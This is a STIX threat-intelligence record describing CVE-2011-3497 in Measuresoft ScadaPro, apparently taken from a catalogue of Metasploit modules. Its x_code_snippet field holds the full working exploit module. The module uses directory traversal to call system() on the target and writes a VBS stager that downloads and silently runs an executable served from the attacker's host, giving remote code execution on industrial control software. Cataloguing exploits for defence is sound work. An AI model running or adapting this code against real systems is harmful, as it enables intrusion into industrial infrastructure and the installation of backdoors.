{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--314e22f4-6fa0-4688-86f7-698db21fafb4",
    "created": "2024-08-14T16:39:07.172868Z",
    "modified": "2024-08-14T16:39:07.172872Z",
    "name": "Measuresoft ScadaPro Remote Command Execution",
    "description": " This module allows remote attackers to execute arbitrary commands on the affected system by abusing via Directory Traversal attack when using the 'xf' command (execute function). An attacker can execute system() from msvcrt.dll to upload a backdoor and gain remote code execution. This vulnerability affects version 4.0.0 and earlier.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/scadapro_cmdexe.rb",
            "external_id": "scadapro_cmdexe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3497"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/scadapro_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Measuresoft ScadaPro Remote Command Execution',\n      'Description'    => %q{\n        This module allows remote attackers to execute arbitrary commands on the\n        affected system by abusing via Directory Traversal attack when using the\n        'xf' command (execute function). An attacker can execute system() from\n        msvcrt.dll to upload a backdoor and gain remote code execution. This\n        vulnerability affects version 4.0.0 and earlier.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma',                           # Initial discovery/poc\n          'mr_me <steventhomasseeley[at]gmail.com>',  # msf\n          'TecR0c <tecr0c[at]tecninja.net>',          # msf\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3497'],\n          [ 'OSVDB', '75490'],\n          [ 'BID', '49613'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/scadapro_1-adv.txt'],\n          [ 'URL', 'http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf'],\n          # seemed pretty accurate to us ;)\n          [ 'URL', 'http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx'],\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # truly universal\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-09-16'))\n\n      register_options(\n      [\n        Opt::RPORT(11234),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),\n      ])\n  end\n\n  # couldn't generate a vbs or exe payload and then use the wF command\n  # as there is a limit to the amount of data to write to disk.\n  # so we just write out a vbs script like the old days.\n\n  def build_vbs(url, stager_name)\n    name_xmlhttp = rand_text_alpha(2)\n    name_adodb   = rand_text_alpha(2)\n\n    tmp = \"#{@temp_folder}/#{stager_name}\"\n\n    vbs  = \"echo Set #{name_xmlhttp} = CreateObject(\\\"Microsoft.XMLHTTP\\\") \"\n    vbs << \": #{name_xmlhttp}.open \\\"GET\\\",\\\"http://#{url}\\\",False : #{name_xmlhttp}.send\"\n    vbs << \": Set #{name_adodb} = CreateObject(\\\"ADODB.Stream\\\") \"\n    vbs << \": #{name_adodb}.Open : #{name_adodb}.Type=1 \"\n    vbs << \": #{name_adodb}.Write #{name_xmlhttp}.responseBody \"\n    vbs << \": #{name_adodb}.SaveToFile \\\"#{@temp_folder}/#{@payload_name}.exe\\\",2 \"\n    vbs << \": CreateObject(\\\"WScript.Shell\\\").Run \\\"#{@temp_folder}/#{@payload_name}.exe\\\",0 >> #{tmp}\"\n\n    return vbs\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.exe/\n      print_status(\"Sending 2nd stage payload\")\n      return if ((p=regenerate_payload(cli)) == nil)\n      data = generate_payload_exe( {:code=>p.encoded} )\n      send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )\n      return\n    end\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @payload_name = rand_text_alpha(4)\n    @temp_folder  = \"C:/Windows/Temp\"\n\n    if datastore['SRVHOST'] == '0.0.0.0'\n      lhost = Rex::Socket.source_address('50.50.50.50')\n    else\n      lhost = datastore['SRVHOST']\n    end\n\n    payload_src  = lhost\n    payload_src << \":#{datastore['SRVPORT']}#{datastore['URIPATH']}#{@payload_name}.exe\"\n\n    stager_name = rand_text_alpha(6) + \".vbs\"\n    stager      = build_vbs(payload_src, stager_name)\n\n    path = \"..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\"\n\n    createvbs = \"xf%#{path}\\\\msvcrt.dll,system,cmd /c #{stager}\\r\\n\"\n    download_execute = \"xf%#{path}\\\\msvcrt.dll,system,start #{@temp_folder}/#{stager_name}\\r\\n\"\n\n    print_status(\"Sending 1st stage payload...\")\n\n    connect\n    sock.get_once()\n    sock.put(createvbs)\n    sock.get_once()\n    sock.put(download_execute)\n    handler()\n    disconnect\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-16",
    "x_mitre_platforms": [
        "win'"
    ]
}